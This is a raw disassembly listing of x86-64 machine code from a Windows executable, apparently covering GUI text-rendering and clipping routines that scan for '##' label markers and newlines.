   14000436a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004370:	80 7c 06 01 00       	cmpb   $0x0,0x1(%rsi,%rax,1)
   140004375:	48 8d 40 01          	lea    0x1(%rax),%rax
   140004379:	75 f5                	jne    0x140004370
   14000437b:	4c 8d 04 30          	lea    (%rax,%rsi,1),%r8
   14000437f:	48 8b d6             	mov    %rsi,%rdx
   140004382:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004387:	e8 b4 47 01 00       	call   0x140018b40
   14000438c:	41 8b 84 24 88 01 00 	mov    0x188(%r12),%eax
   140004393:	00 
   140004394:	8b 8d d0 5c 00 00    	mov    0x5cd0(%rbp),%ecx
   14000439a:	3b c8                	cmp    %eax,%ecx
   14000439c:	7e 08                	jle    0x1400043a6
   14000439e:	89 85 d0 5c 00 00    	mov    %eax,0x5cd0(%rbp)
   1400043a4:	8b c8                	mov    %eax,%ecx
   1400043a6:	45 8b a4 24 88 01 00 	mov    0x188(%r12),%r12d
   1400043ad:	00 
   1400043ae:	44 2b e1             	sub    %ecx,%r12d
   1400043b1:	4c 8b c3             	mov    %rbx,%r8
   1400043b4:	ba 0a 00 00 00       	mov    $0xa,%edx
   1400043b9:	4c 2b c7             	sub    %rdi,%r8
   1400043bc:	48 8b cf             	mov    %rdi,%rcx
   1400043bf:	e8 93 b4 03 00       	call   0x14003f857
   1400043c4:	48 85 c0             	test   %rax,%rax
   1400043c7:	48 8b f3             	mov    %rbx,%rsi
   1400043ca:	48 0f 45 f0          	cmovne %rax,%rsi
   1400043ce:	48 3b fe             	cmp    %rsi,%rdi
   1400043d1:	75 05                	jne    0x1400043d8
   1400043d3:	48 3b f3             	cmp    %rbx,%rsi
   1400043d6:	74 61                	je     0x140004439
   1400043d8:	44 8b ce             	mov    %esi,%r9d
   1400043db:	42 8d 14 a5 00 00 00 	lea    0x0(,%r12,4),%edx
   1400043e2:	00 
   1400043e3:	44 2b cf             	sub    %edi,%r9d
   1400043e6:	80 bd cc 5c 00 00 00 	cmpb   $0x0,0x5ccc(%rbp)
   1400043ed:	75 05                	jne    0x1400043f4
   1400043ef:	ba 01 00 00 00       	mov    $0x1,%edx
   1400043f4:	4c 8d 05 33 d5 03 00 	lea    0x3d533(%rip),%r8        # 0x14004192e
   1400043fb:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004400:	48 8d 0d e1 e2 03 00 	lea    0x3e2e1(%rip),%rcx        # 0x1400426e8
   140004407:	e8 f4 46 01 00       	call   0x140018b00
   14000440c:	c6 85 cc 5c 00 00 00 	movb   $0x0,0x5ccc(%rbp)
   140004413:	80 3e 0a             	cmpb   $0xa,(%rsi)
   140004416:	75 13                	jne    0x14000442b
   140004418:	48 8d 0d c5 e2 03 00 	lea    0x3e2c5(%rip),%rcx        # 0x1400426e4
   14000441f:	e8 dc 46 01 00       	call   0x140018b00
   140004424:	c6 85 cc 5c 00 00 01 	movb   $0x1,0x5ccc(%rbp)
   14000442b:	48 3b f3             	cmp    %rbx,%rsi
   14000442e:	74 09                	je     0x140004439
   140004430:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   140004434:	e9 78 ff ff ff       	jmp    0x1400043b1
   140004439:	4c 8b a4 24 88 00 00 	mov    0x88(%rsp),%r12
   140004440:	00 
   140004441:	4d 85 ff             	test   %r15,%r15
   140004444:	74 27                	je     0x14000446d
   140004446:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000444d:	00 00 00 
   140004450:	43 80 7c 37 01 00    	cmpb   $0x0,0x1(%r15,%r14,1)
   140004456:	4d 8d 76 01          	lea    0x1(%r14),%r14
   14000445a:	75 f4                	jne    0x140004450
   14000445c:	4f 8d 04 3e          	lea    (%r14,%r15,1),%r8
   140004460:	49 8b d7             	mov    %r15,%rdx
   140004463:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004468:	e8 d3 46 01 00       	call   0x140018b40
   14000446d:	4c 8b bc 24 80 00 00 	mov    0x80(%rsp),%r15
   140004474:	00 
   140004475:	0f 28 74 24 70       	movaps 0x70(%rsp),%xmm6
   14000447a:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140004481:	41 5e                	pop    %r14
   140004483:	5f                   	pop    %rdi
   140004484:	5e                   	pop    %rsi
   140004485:	5d                   	pop    %rbp
   140004486:	5b                   	pop    %rbx
   140004487:	c3                   	ret
   140004488:	cc                   	int3
   140004489:	cc                   	int3
   14000448a:	cc                   	int3
   14000448b:	cc                   	int3
   14000448c:	cc                   	int3
   14000448d:	cc                   	int3
   14000448e:	cc                   	int3
   14000448f:	cc                   	int3
   140004490:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004495:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000449a:	55                   	push   %rbp
   14000449b:	57                   	push   %rdi
   14000449c:	41 55                	push   %r13
   14000449e:	41 56                	push   %r14
   1400044a0:	41 57                	push   %r15
   1400044a2:	48 8b ec             	mov    %rsp,%rbp
   1400044a5:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400044ac:	48 8b 45 58          	mov    0x58(%rbp),%rax
   1400044b0:	49 8b d9             	mov    %r9,%rbx
   1400044b3:	f2 0f 10 02          	movsd  (%rdx),%xmm0
   1400044b7:	4d 8b f8             	mov    %r8,%r15
   1400044ba:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   1400044be:	4c 8b f2             	mov    %rdx,%r14
   1400044c1:	48 8b 35 38 b3 04 00 	mov    0x4b338(%rip),%rsi        # 0x14004f800
   1400044c8:	4c 8b e9             	mov    %rcx,%r13
   1400044cb:	0f 29 74 24 70       	movaps %xmm6,0x70(%rsp)
   1400044d0:	0f 57 f6             	xorps  %xmm6,%xmm6
   1400044d3:	f2 0f 11 45 38       	movsd  %xmm0,0x38(%rbp)
   1400044d8:	48 85 c0             	test   %rax,%rax
   1400044db:	74 0f                	je     0x1400044ec
   1400044dd:	f2 0f 10 00          	movsd  (%rax),%xmm0
   1400044e1:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400044e5:	f2 0f 11 45 d8       	movsd  %xmm0,-0x28(%rbp)
   1400044ea:	eb 6e                	jmp    0x14000455a
   1400044ec:	f3 0f 10 96 10 3c 00 	movss  0x3c10(%rsi),%xmm2
   1400044f3:	00 
   1400044f4:	48 3b df             	cmp    %rdi,%rbx
   1400044f7:	75 0e                	jne    0x140004507
   1400044f9:	f3 0f 11 55 d4       	movss  %xmm2,-0x2c(%rbp)
   1400044fe:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
   140004505:	eb 4f                	jmp    0x140004556
   140004507:	f3 0f 10 1d d1 3d 04 	movss  0x43dd1(%rip),%xmm3        # 0x1400482e0
   14000450e:	00 
   14000450f:	48 8d 55 58          	lea    0x58(%rbp),%rdx
   140004513:	48 8b 8e 08 3c 00 00 	mov    0x3c08(%rsi),%rcx
   14000451a:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000451f:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140004524:	f3 0f 11 74 24 20    	movss  %xmm6,0x20(%rsp)
   14000452a:	e8 21 59 02 00       	call   0x140029e50
   14000452f:	f3 0f 10 45 58       	movss  0x58(%rbp),%xmm0
   140004534:	f3 0f 58 05 a0 3c 04 	addss  0x43ca0(%rip),%xmm0        # 0x1400481dc
   14000453b:	00 
   14000453c:	f3 0f 10 4d 5c       	movss  0x5c(%rbp),%xmm1
   140004541:	f3 0f 11 4d d4       	movss  %xmm1,-0x2c(%rbp)
   140004546:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   14000454a:	66 0f 6e c0          	movd   %eax,%xmm0
   14000454e:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   140004551:	f3 0f 11 45 d0       	movss  %xmm0,-0x30(%rbp)
   140004556:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   14000455a:	f3 0f 10 20          	movss  (%rax),%xmm4
   14000455e:	f3 0f 10 68 04       	movss  0x4(%rax),%xmm5
   140004563:	48 8b 45 68          	mov    0x68(%rbp),%rax
   140004567:	48 85 c0             	test   %rax,%rax
   14000456a:	4c 8b c0             	mov    %rax,%r8
   14000456d:	4d 0f 44 c6          	cmove  %r14,%r8
   140004571:	4c 8d 48 08          	lea    0x8(%rax),%r9
   140004575:	75 03                	jne    0x14000457a
   140004577:	4d 8b cf             	mov    %r15,%r9
   14000457a:	f3 0f 10 55 38       	movss  0x38(%rbp),%xmm2
   14000457f:	0f 28 c4             	movaps %xmm4,%xmm0
   140004582:	f3 0f 10 4d 3c       	movss  0x3c(%rbp),%xmm1
   140004587:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   14000458b:	41 0f 2f 01          	comiss (%r9),%xmm0
   14000458f:	73 12                	jae    0x1400045a3
   140004591:	0f 28 c5             	movaps %xmm5,%xmm0
   140004594:	f3 0f 58 c1          	addss  %xmm1,%xmm0
   140004598:	41 0f 2f 41 04       	comiss 0x4(%r9),%xmm0
   14000459d:	73 04                	jae    0x1400045a3
   14000459f:	32 c9                	xor    %cl,%cl
   1400045a1:	eb 02                	jmp    0x1400045a5
   1400045a3:	b1 01                	mov    $0x1,%cl
   1400045a5:	48 85 c0             	test   %rax,%rax
   1400045a8:	74 1d                	je     0x1400045c7
   1400045aa:	f3 41 0f 10 00       	movss  (%r8),%xmm0
   1400045af:	0f 2f c2             	comiss %xmm2,%xmm0
   1400045b2:	77 0f                	ja     0x1400045c3
   1400045b4:	f3 41 0f 10 40 04    	movss  0x4(%r8),%xmm0
   1400045ba:	0f 2f c1             	comiss %xmm1,%xmm0
   1400045bd:	77 04                	ja     0x1400045c3
   1400045bf:	32 c0                	xor    %al,%al
   1400045c1:	eb 02                	jmp    0x1400045c5
   1400045c3:	b0 01                	mov    $0x1,%al
   1400045c5:	0a c8                	or     %al,%cl
   1400045c7:	48 8b 45 60          	mov    0x60(%rbp),%rax
   1400045cb:	f3 0f 10 18          	movss  (%rax),%xmm3
   1400045cf:	0f 2f de             	comiss %xmm6,%xmm3
   1400045d2:	76 1e                	jbe    0x1400045f2
   1400045d4:	f3 41 0f 10 07       	movss  (%r15),%xmm0
   1400045d9:	f3 0f 5c c2          	subss  %xmm2,%xmm0
   1400045dd:	f3 0f 5c c4          	subss  %xmm4,%xmm0
   1400045e1:	f3 0f 59 c3          	mulss  %xmm3,%xmm0
   1400045e5:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   1400045e9:	f3 0f 5f d0          	maxss  %xmm0,%xmm2
   1400045ed:	f3 0f 11 55 38       	movss  %xmm2,0x38(%rbp)
   1400045f2:	f3 0f 10 50 04       	movss  0x4(%rax),%xmm2
   1400045f7:	0f 2f d6             	comiss %xmm6,%xmm2
   1400045fa:	76 1f                	jbe    0x14000461b
   1400045fc:	f3 41 0f 10 47 04    	movss  0x4(%r15),%xmm0
   140004602:	f3 0f 5c c1          	subss  %xmm1,%xmm0
   140004606:	f3 0f 5c c5          	subss  %xmm5,%xmm0
   14000460a:	f3 0f 59 c2          	mulss  %xmm2,%xmm0
   14000460e:	f3 0f 58 c1          	addss  %xmm1,%xmm0
   140004612:	f3 0f 5f c8          	maxss  %xmm0,%xmm1
   140004616:	f3 0f 11 4d 3c       	movss  %xmm1,0x3c(%rbp)
   14000461b:	0f 10 86 a4 38 00 00 	movups 0x38a4(%rsi),%xmm0
   140004622:	84 c9                	test   %cl,%cl
   140004624:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004628:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   14000462c:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   140004630:	f3 0f 59 86 c8 37 00 	mulss  0x37c8(%rsi),%xmm0
   140004637:	00 
   140004638:	f3 0f 11 45 ec       	movss  %xmm0,-0x14(%rbp)
   14000463d:	0f 84 81 00 00 00    	je     0x1400046c4
   140004643:	e8 78 f1 ff ff       	call   0x1400037c0
   140004648:	a9 00 00 00 ff       	test   $0xff000000,%eax
   14000464d:	0f 84 e8 00 00 00    	je     0x14000473b
   140004653:	48 85 ff             	test   %rdi,%rdi
   140004656:	75 17                	jne    0x14000466f
   140004658:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000465f:	90                   	nop
   140004660:	80 7c 0b 01 00       	cmpb   $0x0,0x1(%rbx,%rcx,1)
   140004665:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140004669:	75 f5                	jne    0x140004660
   14000466b:	48 8d 3c 19          	lea    (%rcx,%rbx,1),%rdi
   14000466f:	48 3b df             	cmp    %rdi,%rbx
   140004672:	0f 84 c3 00 00 00    	je     0x14000473b
   140004678:	41 0f 10 85 88 00 00 	movups 0x88(%r13),%xmm0
   14000467f:	00 
   140004680:	c6 44 24 48 01       	movb   $0x1,0x48(%rsp)
   140004685:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140004689:	f3 41 0f 5f 00       	maxss  (%r8),%xmm0
   14000468e:	f3 0f 10 4d e8       	movss  -0x18(%rbp),%xmm1
   140004693:	f3 41 0f 5d 09       	minss  (%r9),%xmm1
   140004698:	f3 0f 11 45 e0       	movss  %xmm0,-0x20(%rbp)
   14000469d:	f3 0f 10 45 e4       	movss  -0x1c(%rbp),%xmm0
   1400046a2:	f3 41 0f 5f 40 04    	maxss  0x4(%r8),%xmm0
   1400046a8:	f3 0f 11 4d e8       	movss  %xmm1,-0x18(%rbp)
   1400046ad:	f3 0f 11 45 e4       	movss  %xmm0,-0x1c(%rbp)
   1400046b2:	f3 0f 10 45 ec       	movss  -0x14(%rbp),%xmm0
   1400046b7:	f3 41 0f 5d 41 04    	minss  0x4(%r9),%xmm0
   1400046bd:	f3 0f 11 45 ec       	movss  %xmm0,-0x14(%rbp)
   1400046c2:	eb 41                	jmp    0x140004705
   1400046c4:	e8 f7 f0 ff ff       	call   0x1400037c0
   1400046c9:	a9 00 00 00 ff       	test   $0xff000000,%eax
   1400046ce:	74 6b                	je     0x14000473b
   1400046d0:	48 85 ff             	test   %rdi,%rdi
   1400046d3:	75 1a                	jne    0x1400046ef
   1400046d5:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400046dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400046e0:	80 7c 0b 01 00       	cmpb   $0x0,0x1(%rbx,%rcx,1)
   1400046e5:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   1400046e9:	75 f5                	jne    0x1400046e0
   1400046eb:	48 8d 3c 19          	lea    (%rcx,%rbx,1),%rdi
   1400046ef:	48 3b df             	cmp    %rdi,%rbx
   1400046f2:	74 47                	je     0x14000473b
   1400046f4:	41 0f 10 85 88 00 00 	movups 0x88(%r13),%xmm0
   1400046fb:	00 
   1400046fc:	c6 44 24 48 00       	movb   $0x0,0x48(%rsp)
   140004701:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140004705:	49 8b 4d 38          	mov    0x38(%r13),%rcx
   140004709:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000470d:	f3 0f 11 74 24 40    	movss  %xmm6,0x40(%rsp)
   140004713:	4c 8d 4d 38          	lea    0x38(%rbp),%r9
   140004717:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000471c:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140004721:	f3 0f 10 51 10       	movss  0x10(%rcx),%xmm2
   140004726:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000472a:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000472f:	49 8b d5             	mov    %r13,%rdx
   140004732:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140004736:	e8 35 59 02 00       	call   0x14002a070
   14000473b:	0f 28 74 24 70       	movaps 0x70(%rsp),%xmm6
   140004740:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140004747:	00 
   140004748:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000474c:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004750:	49 8b e3             	mov    %r11,%rsp
   140004753:	41 5f                	pop    %r15
   140004755:	41 5e                	pop    %r14
   140004757:	41 5d                	pop    %r13
   140004759:	5f                   	pop    %rdi
   14000475a:	5d                   	pop    %rbp
   14000475b:	c3                   	ret
   14000475c:	cc                   	int3
   14000475d:	cc                   	int3
   14000475e:	cc                   	int3
   14000475f:	cc                   	int3
   140004760:	40 55                	rex push %rbp
   140004762:	57                   	push   %rdi
   140004763:	41 55                	push   %r13
   140004765:	41 56                	push   %r14
   140004767:	48 83 ec 48          	sub    $0x48,%rsp
   14000476b:	49 8b f8             	mov    %r8,%rdi
   14000476e:	49 8b e8             	mov    %r8,%rbp
   140004771:	4d 85 c9             	test   %r9,%r9
   140004774:	49 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%r14
   14000477b:	4d 8b c6             	mov    %r14,%r8
   14000477e:	4c 8b e9             	mov    %rcx,%r13
   140004781:	4d 0f 45 c1          	cmovne %r9,%r8
   140004785:	49 3b f8             	cmp    %r8,%rdi
   140004788:	73 1e                	jae    0x1400047a8
   14000478a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004790:	0f b6 07             	movzbl (%rdi),%eax
   140004793:	84 c0                	test   %al,%al
   140004795:	74 11                	je     0x1400047a8
   140004797:	3c 23                	cmp    $0x23,%al
   140004799:	75 05                	jne    0x1400047a0
   14000479b:	38 47 01             	cmp    %al,0x1(%rdi)
   14000479e:	74 08                	je     0x1400047a8
   1400047a0:	48 ff c7             	inc    %rdi
   1400047a3:	49 3b f8             	cmp    %r8,%rdi
   1400047a6:	72 e8                	jb     0x140004790
   1400047a8:	3b fd                	cmp    %ebp,%edi
   1400047aa:	0f 84 35 02 00 00    	je     0x1400049e5
   1400047b0:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   1400047b7:	00 
   1400047b8:	4c 8b c2             	mov    %rdx,%r8
   1400047bb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400047c0:	4c 8b cd             	mov    %rbp,%r9
   1400047c3:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   1400047ca:	00 
   1400047cb:	49 8b d5             	mov    %r13,%rdx
   1400047ce:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400047d3:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   1400047da:	00 
   1400047db:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400047e0:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   1400047e5:	48 8b 1d 14 b0 04 00 	mov    0x4b014(%rip),%rbx        # 0x14004f800
   1400047ec:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400047f1:	48 8b 8b d8 3e 00 00 	mov    0x3ed8(%rbx),%rcx
   1400047f8:	48 8b 89 98 02 00 00 	mov    0x298(%rcx),%rcx
   1400047ff:	e8 8c fc ff ff       	call   0x140004490
   140004804:	80 bb 98 5c 00 00 00 	cmpb   $0x0,0x5c98(%rbx)
   14000480b:	0f 84 cf 01 00 00    	je     0x1400049e0
   140004811:	48 89 74 24 78       	mov    %rsi,0x78(%rsp)
   140004816:	33 c0                	xor    %eax,%eax
   140004818:	48 8b 35 e1 af 04 00 	mov    0x4afe1(%rip),%rsi        # 0x14004f800
   14000481f:	4c 89 a4 24 80 00 00 	mov    %r12,0x80(%rsp)
   140004826:	00 
   140004827:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   14000482c:	48 8b 9e b8 5c 00 00 	mov    0x5cb8(%rsi),%rbx
   140004833:	4c 8b be c0 5c 00 00 	mov    0x5cc0(%rsi),%r15
   14000483a:	4c 8b a6 d8 3e 00 00 	mov    0x3ed8(%rsi),%r12
   140004841:	48 89 86 c0 5c 00 00 	mov    %rax,0x5cc0(%rsi)
   140004848:	48 89 86 b8 5c 00 00 	mov    %rax,0x5cb8(%rsi)
   14000484f:	48 85 ff             	test   %rdi,%rdi
   140004852:	75 28                	jne    0x14000487c
   140004854:	48 8b fd             	mov    %rbp,%rdi
   140004857:	49 3b ee             	cmp    %r14,%rbp
   14000485a:	73 20                	jae    0x14000487c
   14000485c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004860:	0f b6 0f             	movzbl (%rdi),%ecx
   140004863:	84 c9                	test   %cl,%cl
   140004865:	74 15                	je     0x14000487c
   140004867:	48 8d 47 01          	lea    0x1(%rdi),%rax
   14000486b:	80 f9 23             	cmp    $0x23,%cl
   14000486e:	75 04                	jne    0x140004874
   140004870:	38 08                	cmp    %cl,(%rax)
   140004872:	74 08                	je     0x14000487c
   140004874:	48 8b f8             	mov    %rax,%rdi
   140004877:	49 3b c6             	cmp    %r14,%rax
   14000487a:	72 e4                	jb     0x140004860
   14000487c:	49 8d 45 04          	lea    0x4(%r13),%rax
   140004880:	4d 85 ed             	test   %r13,%r13
   140004883:	74 25                	je     0x1400048aa
   140004885:	f3 0f 10 8e c8 5c 00 	movss  0x5cc8(%rsi),%xmm1
   14000488c:	00 
   14000488d:	f3 0f 58 8e 08 38 00 	addss  0x3808(%rsi),%xmm1
   140004894:	00 
   140004895:	f3 0f 10 00          	movss  (%rax),%xmm0
   140004899:	f3 0f 58 0d 43 39 04 	addss  0x43943(%rip),%xmm1        # 0x1400481e4
   1400048a0:	00 
   1400048a1:	0f 2f c1             	comiss %xmm1,%xmm0
   1400048a4:	76 04                	jbe    0x1400048aa
   1400048a6:	b1 01                	mov    $0x1,%cl
   1400048a8:	eb 07                	jmp    0x1400048b1
   1400048aa:	32 c9                	xor    %cl,%cl
   1400048ac:	4d 85 ed             	test   %r13,%r13
   1400048af:	74 1f                	je     0x1400048d0
   1400048b1:	8b 00                	mov    (%rax),%eax
   1400048b3:	89 86 c8 5c 00 00    	mov    %eax,0x5cc8(%rsi)
   1400048b9:	84 c9                	test   %cl,%cl
   1400048bb:	74 13                	je     0x1400048d0
   1400048bd:	48 8d 0d 20 de 03 00 	lea    0x3de20(%rip),%rcx        # 0x1400426e4
   1400048c4:	e8 37 42 01 00       	call   0x140018b00
   1400048c9:	c6 86 cc 5c 00 00 01 	movb   $0x1,0x5ccc(%rsi)
   1400048d0:	48 85 db             	test   %rbx,%rbx
   1400048d3:	74 25                	je     0x1400048fa
   1400048d5:	49 8b c6             	mov    %r14,%rax
   1400048d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400048df:	00 
   1400048e0:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   1400048e5:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400048e9:	75 f5                	jne    0x1400048e0
   1400048eb:	4c 8d 04 18          	lea    (%rax,%rbx,1),%r8
   1400048ef:	48 8b d3             	mov    %rbx,%rdx
   1400048f2:	49 8b cd             	mov    %r13,%rcx
   1400048f5:	e8 46 42 01 00       	call   0x140018b40
   1400048fa:	41 8b 84 24 88 01 00 	mov    0x188(%r12),%eax
   140004901:	00 
   140004902:	8b 8e d0 5c 00 00    	mov    0x5cd0(%rsi),%ecx
   140004908:	3b c8                	cmp    %eax,%ecx
   14000490a:	7e 08                	jle    0x140004914
   14000490c:	89 86 d0 5c 00 00    	mov    %eax,0x5cd0(%rsi)
   140004912:	8b c8                	mov    %eax,%ecx
   140004914:	45 8b a4 24 88 01 00 	mov    0x188(%r12),%r12d
   14000491b:	00 
   14000491c:	44 2b e1             	sub    %ecx,%r12d
   14000491f:	90                   	nop
   140004920:	4c 8b c7             	mov    %rdi,%r8
   140004923:	ba 0a 00 00 00       	mov    $0xa,%edx
   140004928:	4c 2b c5             	sub    %rbp,%r8
   14000492b:	48 8b cd             	mov    %rbp,%rcx
   14000492e:	e8 24 af 03 00       	call   0x14003f857
   140004933:	48 85 c0             	test   %rax,%rax
   140004936:	48 8b df             	mov    %rdi,%rbx
   140004939:	48 0f 45 d8          	cmovne %rax,%rbx
   14000493d:	48 3b eb             	cmp    %rbx,%rbp
   140004940:	75 05                	jne    0x140004947
   140004942:	48 3b df             	cmp    %rdi,%rbx
   140004945:	74 61                	je     0x1400049a8
   140004947:	44 8b cb             	mov    %ebx,%r9d
   14000494a:	42 8d 14 a5 00 00 00 	lea    0x0(,%r12,4),%edx
   140004951:	00 
   140004952:	44 2b cd             	sub    %ebp,%r9d
   140004955:	80 be cc 5c 00 00 00 	cmpb   $0x0,0x5ccc(%rsi)
   14000495c:	75 05                	jne    0x140004963
   14000495e:	ba 01 00 00 00       	mov    $0x1,%edx
   140004963:	4c 8d 05 c4 cf 03 00 	lea    0x3cfc4(%rip),%r8        # 0x14004192e
   14000496a:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000496f:	48 8d 0d 72 dd 03 00 	lea    0x3dd72(%rip),%rcx        # 0x1400426e8
   140004976:	e8 85 41 01 00       	call   0x140018b00
   14000497b:	c6 86 cc 5c 00 00 00 	movb   $0x0,0x5ccc(%rsi)
   140004982:	80 3b 0a             	cmpb   $0xa,(%rbx)
   140004985:	75 13                	jne    0x14000499a
   140004987:	48 8d 0d 56 dd 03 00 	lea    0x3dd56(%rip),%rcx        # 0x1400426e4
   14000498e:	e8 6d 41 01 00       	call   0x140018b00
   140004993:	c6 86 cc 5c 00 00 01 	movb   $0x1,0x5ccc(%rsi)
   14000499a:	48 3b df             	cmp    %rdi,%rbx
   14000499d:	74 09                	je     0x1400049a8
   14000499f:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
   1400049a3:	e9 78 ff ff ff       	jmp    0x140004920
   1400049a8:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   1400049af:	00 
   1400049b0:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400049b5:	4d 85 ff             	test   %r15,%r15
   1400049b8:	74 21                	je     0x1400049db
   1400049ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400049c0:	43 80 7c 37 01 00    	cmpb   $0x0,0x1(%r15,%r14,1)
   1400049c6:	4d 8d 76 01          	lea    0x1(%r14),%r14
   1400049ca:	75 f4                	jne    0x1400049c0
   1400049cc:	4f 8d 04 3e          	lea    (%r14,%r15,1),%r8
   1400049d0:	49 8b d7             	mov    %r15,%rdx
   1400049d3:	49 8b cd             	mov    %r13,%rcx
   1400049d6:	e8 65 41 01 00       	call   0x140018b40
   1400049db:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   1400049e0:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400049e5:	48 83 c4 48          	add    $0x48,%rsp
   1400049e9:	41 5e                	pop    %r14
   1400049eb:	41 5d                	pop    %r13
   1400049ed:	5f                   	pop    %rdi
   1400049ee:	5d                   	pop    %rbp
   1400049ef:	c3                   	ret
   1400049f0:	48 8b c4             	mov    %rsp,%rax
   1400049f3:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1400049f7:	57                   	push   %rdi
   1400049f8:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400049ff:	48 8b 3d fa ad 04 00 	mov    0x4adfa(%rip),%rdi        # 0x14004f800
   140004a06:	0f 29 78 d8          	movaps %xmm7,-0x28(%rax)
   140004a0a:	f3 0f 10 bc 24 c0 00 	movss  0xc0(%rsp),%xmm7
   140004a11:	00 00 
   140004a13:	48 89 58 18          	mov    %rbx,0x18(%rax)
   140004a17:	41 0f b6 d9          	movzbl %r9b,%ebx
   140004a1b:	48 8b b7 d8 3e 00 00 	mov    0x3ed8(%rdi),%rsi
   140004a22:	45 8b c8             	mov    %r8d,%r9d
   140004a25:	48 89 50 a8          	mov    %rdx,-0x58(%rax)
   140004a29:	4c 8d 40 a8          	lea    -0x58(%rax),%r8
   140004a2d:	48 89 48 b0          	mov    %rcx,-0x50(%rax)
   140004a31:	48 8d 50 b0          	lea    -0x50(%rax),%rdx
   140004a35:	c7 40 90 00 00 00 00 	movl   $0x0,-0x70(%rax)
   140004a3c:	48 8b 8e 98 02 00 00 	mov    0x298(%rsi),%rcx
   140004a43:	f3 0f 11 78 88       	movss  %xmm7,-0x78(%rax)
   140004a48:	e8 63 1a 02 00       	call   0x1400264b0
   140004a4d:	84 db                	test   %bl,%bl
   140004a4f:	48 8b 9c 24 b0 00 00 	mov    0xb0(%rsp),%rbx
   140004a56:	00 
   140004a57:	0f 84 14 01 00 00    	je     0x140004b71
   140004a5d:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
   140004a64:	00 
   140004a65:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004a68:	f3 0f 10 b7 10 38 00 	movss  0x3810(%rdi),%xmm6
   140004a6f:	00 
   140004a70:	0f 2f f0             	comiss %xmm0,%xmm6
   140004a73:	0f 86 f0 00 00 00    	jbe    0x140004b69
   140004a79:	f3 0f 10 15 63 37 04 	movss  0x43763(%rip),%xmm2        # 0x1400481e4
   140004a80:	00 
   140004a81:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004a86:	48 8b 05 73 ad 04 00 	mov    0x4ad73(%rip),%rax        # 0x14004f800
   140004a8d:	f3 0f 10 4c 24 48    	movss  0x48(%rsp),%xmm1
   140004a93:	f3 0f 58 ca          	addss  %xmm2,%xmm1
   140004a97:	0f 10 80 04 39 00 00 	movups 0x3904(%rax),%xmm0
   140004a9e:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   140004aa3:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   140004aa7:	f3 0f 59 80 c8 37 00 	mulss  0x37c8(%rax),%xmm0
   140004aae:	00 
   140004aaf:	f3 0f 11 4c 24 58    	movss  %xmm1,0x58(%rsp)
